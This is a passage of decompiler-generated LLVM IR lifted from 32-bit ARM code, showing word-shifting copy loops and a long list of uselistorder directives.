  %v5_140c0 = and i32 %v4_140c0, %v0_140c0
  %v6_140c0 = icmp slt i32 %v5_140c0, 0
  %v7_140c0 = icmp slt i32 %v2_140c0, 0
  store i1 %v6_140c0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_140c0, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_140c8

dec_label_pc_140c8:                               ; preds = %dec_label_pc_140c8.loopexit, %dec_label_pc_140a4
  %v2_1400c62 = phi i32 [ %v5_140bc, %dec_label_pc_140c8.loopexit ], [ %v1_14098, %dec_label_pc_140a4 ]
  %v0_13ffc58 = phi i32 [ %v2_140c0, %dec_label_pc_140c8.loopexit ], [ %v2_140a8, %dec_label_pc_140a4 ]
  %v0_140c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_140c8 = add i32 %v0_140c8, 3
  store i32 %v1_140c8, i32* %r1.global-to-local, align 4
  br label %bb141

dec_label_pc_140d0:                               ; preds = %dec_label_pc_14060
  br i1 %v5_14140, label %dec_label_pc_1411c, label %dec_label_pc_140d8

dec_label_pc_140d8:                               ; preds = %dec_label_pc_140d0
  store i32 %v2_1413c, i32* %r2.global-to-local, align 4
  %v3_140dc = load i32, i32* @r4, align 4
  store i32 %v3_140dc, i32* %stack_var_-12, align 4
  %v6_140dc = load i32, i32* @r5, align 4
  store i32 %v6_140dc, i32* %stack_var_-8, align 4
  %v9_140dc = load i32, i32* @lr, align 4
  br label %dec_label_pc_140e0

dec_label_pc_140e0:                               ; preds = %dec_label_pc_140e0.dec_label_pc_140e0_crit_edge, %dec_label_pc_140d8
  %v0_14104 = phi i32 [ %v1_14104, %dec_label_pc_140e0.dec_label_pc_140e0_crit_edge ], [ %v0_1409830, %dec_label_pc_140d8 ]
  %v0_140e4 = phi i32 [ %v0_140e4.pre, %dec_label_pc_140e0.dec_label_pc_140e0_crit_edge ], [ %v1_14050, %dec_label_pc_140d8 ]
  %v0_140e0 = phi i32 [ %v0_140e0.pre, %dec_label_pc_140e0.dec_label_pc_140e0_crit_edge ], [ %v2_14054, %dec_label_pc_140d8 ]
  %v3_140e0 = mul i32 %v0_140e0, 65536
  store i32 %v3_140e0, i32* %lr.global-to-local, align 4
  %v1_140e4 = add i32 %v0_140e4, -4
  %v2_140e4 = inttoptr i32 %v1_140e4 to i32*
  %v3_140e4 = load i32, i32* %v2_140e4, align 4
  store i32 %v3_140e4, i32* %r3.global-to-local, align 4
  %v4_140e4 = add i32 %v0_140e4, -8
  %v5_140e4 = inttoptr i32 %v4_140e4 to i32*
  %v6_140e4 = load i32, i32* %v5_140e4, align 4
  store i32 %v6_140e4, i32* %r4.global-to-local, align 4
  %v7_140e4 = add i32 %v0_140e4, -12
  %v8_140e4 = inttoptr i32 %v7_140e4 to i32*
  %v9_140e4 = load i32, i32* %v8_140e4, align 4
  store i32 %v9_140e4, i32* %r5.global-to-local, align 4
  %v10_140e4 = add i32 %v0_140e4, -16
  %v11_140e4 = inttoptr i32 %v10_140e4 to i32*
  %v12_140e4 = load i32, i32* %v11_140e4, align 4
  store i32 %v10_140e4, i32* %r1.global-to-local, align 4
  %v4_140e8 = udiv i32 %v12_140e4, 65536
  %v5_140e8 = or i32 %v4_140e8, %v3_140e0
  store i32 %v5_140e8, i32* %lr.global-to-local, align 4
  %v3_140ec = mul i32 %v12_140e4, 65536
  %v4_140f0 = udiv i32 %v9_140e4, 65536
  %v5_140f0 = or i32 %v3_140ec, %v4_140f0
  store i32 %v5_140f0, i32* @ip, align 4
  %v3_140f4 = mul i32 %v9_140e4, 65536
  %v4_140f8 = udiv i32 %v6_140e4, 65536
  %v5_140f8 = or i32 %v3_140f4, %v4_140f8
  store i32 %v5_140f8, i32* %r5.global-to-local, align 4
  %v3_140fc = mul i32 %v6_140e4, 65536
  %v4_14100 = udiv i32 %v3_140e4, 65536
  %v5_14100 = or i32 %v3_140fc, %v4_14100
  store i32 %v5_14100, i32* %r4.global-to-local, align 4
  %v1_14104 = add i32 %v0_14104, -16
  %v2_14104 = inttoptr i32 %v1_14104 to i32*
  store i32 %v5_14100, i32* %v2_14104, align 4
  %v4_14104 = add i32 %v0_14104, -12
  %v5_14104 = inttoptr i32 %v4_14104 to i32*
  %v6_14104 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_14104, i32* %v5_14104, align 4
  %v7_14104 = add i32 %v0_14104, -8
  %v8_14104 = inttoptr i32 %v7_14104 to i32*
  %v9_14104 = load i32, i32* @ip, align 4
  store i32 %v9_14104, i32* %v8_14104, align 4
  %v10_14104 = add i32 %v0_14104, -4
  %v11_14104 = inttoptr i32 %v10_14104 to i32*
  %v12_14104 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14104, i32* %v11_14104, align 4
  store i32 %v1_14104, i32* %r0.global-to-local, align 4
  %v0_14108 = load i32, i32* %r2.global-to-local, align 4
  %v2_14108 = add i32 %v0_14108, -16
  store i32 %v2_14108, i32* %r2.global-to-local, align 4
  %v6_1410c = icmp slt i32 %v0_14108, 16
  br i1 %v6_1410c, label %dec_label_pc_14110, label %dec_label_pc_140e0.dec_label_pc_140e0_crit_edge

dec_label_pc_140e0.dec_label_pc_140e0_crit_edge:  ; preds = %dec_label_pc_140e0
  %v0_140e0.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_140e4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_140e0

dec_label_pc_14110:                               ; preds = %dec_label_pc_140e0
  %v2_14110 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14110, i32* @r4, align 4
  %v5_14110 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_14110, i32* @r5, align 4
  store i32 %v9_140dc, i32* @lr, align 4
  %v2_14114 = add i32 %v0_14108, -4
  store i32 %v2_14114, i32* %r2.global-to-local, align 4
  %v4_14114 = add i32 %v0_14108, 2147483632
  %v5_14114 = and i32 %v2_14114, %v4_14114
  %v6_14114 = icmp slt i32 %v5_14114, 0
  store i1 %v6_14114, i1* %cpsr_v.global-to-local, align 1
  %v7_14114 = icmp slt i32 %v2_14114, 0
  store i1 %v7_14114, i1* %cpsr_n.global-to-local, align 1
  %v8_14114 = icmp eq i32 %v2_14114, 0
  store i1 %v8_14114, i1* %cpsr_z.global-to-local, align 1
  %v5_14118 = icmp slt i32 %v2_14108, -12
  br i1 %v5_14118, label %dec_label_pc_14134, label %dec_label_pc_1411c

dec_label_pc_1411c:                               ; preds = %dec_label_pc_14110, %dec_label_pc_140d0, %dec_label_pc_1411c
  %v1_14128 = phi i32 [ %v5_14128, %dec_label_pc_1411c ], [ %v1_14104, %dec_label_pc_14110 ], [ %v0_1409830, %dec_label_pc_140d0 ]
  %v0_1411c = load i32, i32* %r3.global-to-local, align 4
  %v3_1411c = mul i32 %v0_1411c, 65536
  store i32 %v3_1411c, i32* %ip.global-to-local, align 4
  %v0_14120 = load i32, i32* %r1.global-to-local, align 4
  %v1_14120 = add i32 %v0_14120, -4
  %v2_14120 = inttoptr i32 %v1_14120 to i32*
  %v3_14120 = load i32, i32* %v2_14120, align 4
  store i32 %v3_14120, i32* %r3.global-to-local, align 4
  store i32 %v1_14120, i32* %r1.global-to-local, align 4
  %v4_14124 = udiv i32 %v3_14120, 65536
  %v5_14124 = or i32 %v4_14124, %v3_1411c
  store i32 %v5_14124, i32* @ip, align 4
  %v2_14128 = add i32 %v1_14128, -4
  %v3_14128 = inttoptr i32 %v2_14128 to i32*
  store i32 %v5_14124, i32* %v3_14128, align 4
  %v4_14128 = load i32, i32* %r0.global-to-local, align 4
  %v5_14128 = add i32 %v4_14128, -4
  store i32 %v5_14128, i32* %r0.global-to-local, align 4
  %v0_1412c = load i32, i32* %r2.global-to-local, align 4
  %v2_1412c = add i32 %v0_1412c, -4
  store i32 %v2_1412c, i32* %r2.global-to-local, align 4
  %v6_14130 = icmp slt i32 %v0_1412c, 4
  br i1 %v6_14130, label %dec_label_pc_14134.loopexit, label %dec_label_pc_1411c

dec_label_pc_14134.loopexit:                      ; preds = %dec_label_pc_1411c
  %v4_1412c = sub i32 3, %v0_1412c
  %v5_1412c = and i32 %v4_1412c, %v0_1412c
  %v6_1412c = icmp slt i32 %v5_1412c, 0
  %v7_1412c = icmp slt i32 %v2_1412c, 0
  store i1 %v6_1412c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1412c, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14134

dec_label_pc_14134:                               ; preds = %dec_label_pc_14134.loopexit, %dec_label_pc_14110
  %v2_1400c63 = phi i32 [ %v5_14128, %dec_label_pc_14134.loopexit ], [ %v1_14104, %dec_label_pc_14110 ]
  %v0_13ffc59 = phi i32 [ %v2_1412c, %dec_label_pc_14134.loopexit ], [ %v2_14114, %dec_label_pc_14110 ]
  %v0_14134 = load i32, i32* %r1.global-to-local, align 4
  %v1_14134 = add i32 %v0_14134, 2
  store i32 %v1_14134, i32* %r1.global-to-local, align 4
  br label %bb141

dec_label_pc_1413c:                               ; preds = %dec_label_pc_14050
  br i1 %v5_14140, label %dec_label_pc_14188, label %dec_label_pc_14144

dec_label_pc_14144:                               ; preds = %dec_label_pc_1413c
  store i32 %v2_1413c, i32* %r2.global-to-local, align 4
  %v3_14148 = load i32, i32* @r4, align 4
  store i32 %v3_14148, i32* %stack_var_-12, align 4
  %v6_14148 = load i32, i32* @r5, align 4
  store i32 %v6_14148, i32* %stack_var_-8, align 4
  %v9_14148 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1414c

dec_label_pc_1414c:                               ; preds = %dec_label_pc_1414c.dec_label_pc_1414c_crit_edge, %dec_label_pc_14144
  %v0_14170 = phi i32 [ %v1_14170, %dec_label_pc_1414c.dec_label_pc_1414c_crit_edge ], [ %v0_1409830, %dec_label_pc_14144 ]
  %v0_14150 = phi i32 [ %v0_14150.pre, %dec_label_pc_1414c.dec_label_pc_1414c_crit_edge ], [ %v1_14050, %dec_label_pc_14144 ]
  %v0_1414c = phi i32 [ %v0_1414c.pre, %dec_label_pc_1414c.dec_label_pc_1414c_crit_edge ], [ %v2_14054, %dec_label_pc_14144 ]
  %v3_1414c = mul i32 %v0_1414c, 16777216
  store i32 %v3_1414c, i32* %lr.global-to-local, align 4
  %v1_14150 = add i32 %v0_14150, -4
  %v2_14150 = inttoptr i32 %v1_14150 to i32*
  %v3_14150 = load i32, i32* %v2_14150, align 4
  store i32 %v3_14150, i32* %r3.global-to-local, align 4
  %v4_14150 = add i32 %v0_14150, -8
  %v5_14150 = inttoptr i32 %v4_14150 to i32*
  %v6_14150 = load i32, i32* %v5_14150, align 4
  store i32 %v6_14150, i32* %r4.global-to-local, align 4
  %v7_14150 = add i32 %v0_14150, -12
  %v8_14150 = inttoptr i32 %v7_14150 to i32*
  %v9_14150 = load i32, i32* %v8_14150, align 4
  store i32 %v9_14150, i32* %r5.global-to-local, align 4
  %v10_14150 = add i32 %v0_14150, -16
  %v11_14150 = inttoptr i32 %v10_14150 to i32*
  %v12_14150 = load i32, i32* %v11_14150, align 4
  store i32 %v10_14150, i32* %r1.global-to-local, align 4
  %v4_14154 = udiv i32 %v12_14150, 256
  %v5_14154 = or i32 %v4_14154, %v3_1414c
  store i32 %v5_14154, i32* %lr.global-to-local, align 4
  %v3_14158 = mul i32 %v12_14150, 16777216
  %v4_1415c = udiv i32 %v9_14150, 256
  %v5_1415c = or i32 %v3_14158, %v4_1415c
  store i32 %v5_1415c, i32* @ip, align 4
  %v3_14160 = mul i32 %v9_14150, 16777216
  %v4_14164 = udiv i32 %v6_14150, 256
  %v5_14164 = or i32 %v3_14160, %v4_14164
  store i32 %v5_14164, i32* %r5.global-to-local, align 4
  %v3_14168 = mul i32 %v6_14150, 16777216
  %v4_1416c = udiv i32 %v3_14150, 256
  %v5_1416c = or i32 %v3_14168, %v4_1416c
  store i32 %v5_1416c, i32* %r4.global-to-local, align 4
  %v1_14170 = add i32 %v0_14170, -16
  %v2_14170 = inttoptr i32 %v1_14170 to i32*
  store i32 %v5_1416c, i32* %v2_14170, align 4
  %v4_14170 = add i32 %v0_14170, -12
  %v5_14170 = inttoptr i32 %v4_14170 to i32*
  %v6_14170 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_14170, i32* %v5_14170, align 4
  %v7_14170 = add i32 %v0_14170, -8
  %v8_14170 = inttoptr i32 %v7_14170 to i32*
  %v9_14170 = load i32, i32* @ip, align 4
  store i32 %v9_14170, i32* %v8_14170, align 4
  %v10_14170 = add i32 %v0_14170, -4
  %v11_14170 = inttoptr i32 %v10_14170 to i32*
  %v12_14170 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14170, i32* %v11_14170, align 4
  store i32 %v1_14170, i32* %r0.global-to-local, align 4
  %v0_14174 = load i32, i32* %r2.global-to-local, align 4
  %v2_14174 = add i32 %v0_14174, -16
  store i32 %v2_14174, i32* %r2.global-to-local, align 4
  %v6_14178 = icmp slt i32 %v0_14174, 16
  br i1 %v6_14178, label %dec_label_pc_1417c, label %dec_label_pc_1414c.dec_label_pc_1414c_crit_edge

dec_label_pc_1414c.dec_label_pc_1414c_crit_edge:  ; preds = %dec_label_pc_1414c
  %v0_1414c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_14150.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1414c

dec_label_pc_1417c:                               ; preds = %dec_label_pc_1414c
  %v2_1417c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1417c, i32* @r4, align 4
  %v5_1417c = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_1417c, i32* @r5, align 4
  store i32 %v9_14148, i32* @lr, align 4
  %v2_14180 = add i32 %v0_14174, -4
  store i32 %v2_14180, i32* %r2.global-to-local, align 4
  %v4_14180 = add i32 %v0_14174, 2147483632
  %v5_14180 = and i32 %v2_14180, %v4_14180
  %v6_14180 = icmp slt i32 %v5_14180, 0
  store i1 %v6_14180, i1* %cpsr_v.global-to-local, align 1
  %v7_14180 = icmp slt i32 %v2_14180, 0
  store i1 %v7_14180, i1* %cpsr_n.global-to-local, align 1
  %v8_14180 = icmp eq i32 %v2_14180, 0
  store i1 %v8_14180, i1* %cpsr_z.global-to-local, align 1
  %v5_14184 = icmp slt i32 %v2_14174, -12
  br i1 %v5_14184, label %dec_label_pc_141a0, label %dec_label_pc_14188

dec_label_pc_14188:                               ; preds = %dec_label_pc_1417c, %dec_label_pc_1413c, %dec_label_pc_14188
  %v1_14194 = phi i32 [ %v5_14194, %dec_label_pc_14188 ], [ %v1_14170, %dec_label_pc_1417c ], [ %v0_1409830, %dec_label_pc_1413c ]
  %v0_14188 = load i32, i32* %r3.global-to-local, align 4
  %v3_14188 = mul i32 %v0_14188, 16777216
  store i32 %v3_14188, i32* %ip.global-to-local, align 4
  %v0_1418c = load i32, i32* %r1.global-to-local, align 4
  %v1_1418c = add i32 %v0_1418c, -4
  %v2_1418c = inttoptr i32 %v1_1418c to i32*
  %v3_1418c = load i32, i32* %v2_1418c, align 4
  store i32 %v3_1418c, i32* %r3.global-to-local, align 4
  store i32 %v1_1418c, i32* %r1.global-to-local, align 4
  %v4_14190 = udiv i32 %v3_1418c, 256
  %v5_14190 = or i32 %v4_14190, %v3_14188
  store i32 %v5_14190, i32* @ip, align 4
  %v2_14194 = add i32 %v1_14194, -4
  %v3_14194 = inttoptr i32 %v2_14194 to i32*
  store i32 %v5_14190, i32* %v3_14194, align 4
  %v4_14194 = load i32, i32* %r0.global-to-local, align 4
  %v5_14194 = add i32 %v4_14194, -4
  store i32 %v5_14194, i32* %r0.global-to-local, align 4
  %v0_14198 = load i32, i32* %r2.global-to-local, align 4
  %v2_14198 = add i32 %v0_14198, -4
  store i32 %v2_14198, i32* %r2.global-to-local, align 4
  %v6_1419c = icmp slt i32 %v0_14198, 4
  br i1 %v6_1419c, label %dec_label_pc_141a0.loopexit, label %dec_label_pc_14188

dec_label_pc_141a0.loopexit:                      ; preds = %dec_label_pc_14188
  %v4_14198 = sub i32 3, %v0_14198
  %v5_14198 = and i32 %v4_14198, %v0_14198
  %v6_14198 = icmp slt i32 %v5_14198, 0
  %v7_14198 = icmp slt i32 %v2_14198, 0
  store i1 %v6_14198, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14198, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_141a0

dec_label_pc_141a0:                               ; preds = %dec_label_pc_141a0.loopexit, %dec_label_pc_1417c
  %v2_1400c64 = phi i32 [ %v5_14194, %dec_label_pc_141a0.loopexit ], [ %v1_14170, %dec_label_pc_1417c ]
  %v0_13ffc60 = phi i32 [ %v2_14198, %dec_label_pc_141a0.loopexit ], [ %v2_14180, %dec_label_pc_1417c ]
  %v0_141a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_141a0 = add i32 %v0_141a0, 1
  store i32 %v1_141a0, i32* %r1.global-to-local, align 4
  br label %bb141

; uselistorder directives
  uselistorder i32 %v5_14194, { 0, 2, 1 }
  uselistorder i32 %v3_14188, { 1, 0 }
  uselistorder i32 %v2_14180, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_14170, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_14150, { 1, 0 }
  uselistorder i32 %v3_1414c, { 1, 0 }
  uselistorder i32 %v0_14150, { 3, 2, 1, 0 }
  uselistorder i32 %v0_14170, { 3, 2, 1, 0 }
  uselistorder i32 %v5_14128, { 0, 2, 1 }
  uselistorder i32 %v3_1411c, { 1, 0 }
  uselistorder i32 %v2_14114, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_14104, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_140e4, { 1, 0 }
  uselistorder i32 %v3_140e0, { 1, 0 }
  uselistorder i32 %v0_140e4, { 3, 2, 1, 0 }
  uselistorder i32 %v0_14104, { 3, 2, 1, 0 }
  uselistorder i32 %v5_140bc, { 0, 2, 1 }
  uselistorder i32 %v3_140b0, { 1, 0 }
  uselistorder i32 %v2_140a8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_14098, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_14078, { 1, 0 }
  uselistorder i32 %v3_14074, { 1, 0 }
  uselistorder i32 %v0_14078, { 3, 2, 1, 0 }
  uselistorder i32 %v0_14098, { 3, 2, 1, 0 }
  uselistorder i1 %v5_14140, { 2, 0, 1 }
  uselistorder i32 %v0_14058, { 1, 0 }
  uselistorder i32 %v0_14144, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_1409830, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_14048, { 2, 1, 0 }
  uselistorder i32 %v0_14048, { 2, 0, 1 }
  uselistorder i32 %v2_14040, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_14040, { 1, 2, 0, 3 }
  uselistorder i32 %v0_14040, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1409831, { 2, 1, 0 }
  uselistorder i32 %v11_1401c, { 1, 0 }
  uselistorder i32 %v7_1401c, { 1, 0 }
  uselistorder i32 %v1_13ffc, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_13ffc, { 1, 2, 0, 3 }
  uselistorder i32 %v2_14000, { 1, 0 }
  uselistorder i32 %v7_13ff4, { 0, 2, 1 }
  uselistorder i32 %v10_13ff0, { 1, 0 }
  uselistorder i32 %v9_13fe8, { 1, 0, 2 }
  uselistorder i32 %v6_13fe4, { 1, 0 }
  uselistorder i32 %v2_13fdc, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_13fdc, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_13fec, { 0, 3, 2, 1 }
  uselistorder i32 %v7_13fd0, { 0, 2, 1 }
  uselistorder i32 %v13_13fcc, { 1, 0 }
  uselistorder i32 %v4_13fc8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_13fc8, { 2, 0, 1 }
  uselistorder i32 %v6_13fd0, { 0, 3, 2, 1 }
  uselistorder i32 %v7_13fc0, { 0, 2, 1 }
  uselistorder i32 %v16_13fbc, { 1, 0 }
  uselistorder i32 %v4_13fb8, { 1, 2, 0 }
  uselistorder i32 %v0_13fc8.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_13fc0, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_13fac, { 0, 3, 2, 1 }
  uselistorder i32 %v10_13fa8, { 1, 0 }
  uselistorder i32 %v1_13fa4, { 1, 0 }
  uselistorder i32 %v10_13fa0, { 1, 0 }
  uselistorder i32 %v0_13fa0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_13fa4, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_13f98, { 0, 2, 1 }
  uselistorder i32 %v2_13f8c, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_13f8c, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_13fa448, { 1, 2, 0 }
  uselistorder i32 %v1_13f84, { 2, 1, 0 }
  uselistorder i32 %v1_13f7c, { 2, 3, 1, 0 }
  uselistorder i32 %v2_13f74, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_13f70, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_13f6c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_13f6c, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v4_13f58, { 0, 2, 1 }
  uselistorder i32 %v3_13f4c, { 1, 0 }
  uselistorder i32 %v2_13f44, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v12_13f34, { 1, 0, 3, 2 }
  uselistorder i32 %v8_13f14, { 1, 0, 2 }
  uselistorder i32 %v5_13f14, { 1, 0, 2 }
  uselistorder i32 %v2_13f14, { 1, 0, 2 }
  uselistorder i32 %v3_13f10, { 1, 0 }
  uselistorder i32 %v0_13f14, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_13f34, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_13eec, { 0, 2, 1 }
  uselistorder i32 %v3_13ee0, { 1, 0 }
  uselistorder i32 %v2_13ed8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v12_13ec8, { 1, 0, 3, 2 }
  uselistorder i32 %v8_13ea8, { 1, 0, 2 }
  uselistorder i32 %v5_13ea8, { 1, 0, 2 }
  uselistorder i32 %v2_13ea8, { 1, 0, 2 }
  uselistorder i32 %v3_13ea4, { 1, 0 }
  uselistorder i32 %v0_13ea8, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_13ec8, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_13e80, { 0, 2, 1 }
  uselistorder i32 %v3_13e74, { 1, 0 }
  uselistorder i32 %v2_13e6c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v12_13e5c, { 1, 0, 3, 2 }
  uselistorder i32 %v8_13e3c, { 1, 0, 2 }
  uselistorder i32 %v5_13e3c, { 1, 0, 2 }
  uselistorder i32 %v2_13e3c, { 1, 0, 2 }
  uselistorder i32 %v3_13e38, { 1, 0 }
  uselistorder i32 %v0_13e3c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_13e5c, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v5_13f04, { 2, 0, 1 }
  uselistorder i32 %v0_13f08, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_13e5c74, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_13e0c, { 1, 0 }
  uselistorder i32 %v0_13e0c, { 3, 1, 0, 2 }
  uselistorder i32 %v2_13e04, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_13e04, { 1, 2, 0, 3 }
  uselistorder i32 %v0_13e04, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_13e5c75, { 2, 1, 0 }
  uselistorder i32 %v1_13de4, { 1, 0, 2 }
  uselistorder i32 %v1_13dbc, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_13dbc, { 1, 2, 0, 3 }
  uselistorder i32 %v8_13da8, { 1, 0, 2 }
  uselistorder i32 %v6_13da4, { 1, 0 }
  uselistorder i32 %v2_13d9c, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_13d9c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_13dac, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v4_13d94, { 0, 2, 1 }
  uselistorder i32 %v3_13d94, { 3, 0, 1, 2 }
  uselistorder i1 %v0_13d94, { 1, 0 }
  uselistorder i1 %v1_13d94, { 1, 0 }
  uselistorder i32 %v3_13d90, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_13d88, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v4_13d74, { 1, 2, 0 }
  uselistorder i32 %v12_13d68, { 0, 1, 3, 2 }
  uselistorder i32 %v0_13d5c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_13d60, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v2_13d50, { 0, 2, 1 }
  uselistorder i32 %v2_13d48, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_13d48, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v1_13d40, { 1, 0 }
  uselistorder i32 %v1_13d38, { 2, 1, 0 }
  uselistorder i32 %v2_13d30, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_13d30, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v2_13d20, { 1, 0 }
  uselistorder i32 %v1_13d20, { 1, 5, 6, 3, 4, 0, 7, 9, 2, 8, 10 }
  uselistorder i32 %v0_13d20, { 1, 7, 9, 8, 6, 4, 0, 5, 11, 2, 3, 10, 12 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 15, 16, 17, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 25, 26, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r3.global-to-local, { 0, 37, 1, 2, 3, 38, 4, 5, 6, 39, 35, 36, 40, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32* %r2.global-to-local, { 0, 27, 1, 2, 3, 4, 5, 28, 6, 7, 8, 9, 10, 67, 68, 69, 70, 71, 11, 29, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 30, 31, 62, 32, 33, 34, 35, 36, 63, 37, 38, 39, 40, 41, 64, 42, 43, 44, 45, 46, 65, 47, 48, 50, 49, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 66 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 0, 12, 2, 4, 6, 8, 5, 13, 7, 9, 11, 65, 10, 64, 63, 66, 14, 19, 15, 16, 17, 18, 20, 21, 23, 22, 24, 25, 34, 26, 27, 35, 28, 36, 29, 37, 30, 31, 32, 33, 38, 41, 39, 51, 40, 42, 44, 43, 52, 45, 46, 48, 47, 53, 49, 50, 54, 55, 56, 58, 57, 59, 60, 61, 62 }
  uselistorder i32* %r0.global-to-local, { 0, 21, 1, 2, 22, 3, 4, 34, 36, 5, 6, 7, 8, 9, 23, 10, 12, 11, 13, 14, 35, 15, 16, 24, 17, 18, 19, 20, 25, 26, 27, 29, 28, 30, 31, 32, 33 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 16, 17, 18, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 45, 8, 46, 10, 11, 12, 13, 14, 15, 16, 17, 18, 3, 19, 20, 21, 22, 23, 0, 24, 1, 26, 2, 27, 25, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 42, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20, 21, 22, 0, 23, 1, 25, 2, 26, 24, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 47, 8, 48, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20, 21, 22, 23, 24, 0, 25, 1, 27, 2, 28, 26, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46 }
  uselistorder i32 31, { 18, 19, 1, 0, 10, 12, 11, 13, 2, 15, 14, 20, 21, 16, 17, 6, 7, 3, 8, 4, 5, 9 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 -2, { 12, 13, 11, 17, 0, 15, 1, 16, 2, 3, 8, 10, 9, 7, 6, 5, 4, 18, 19, 20, 21, 14 }
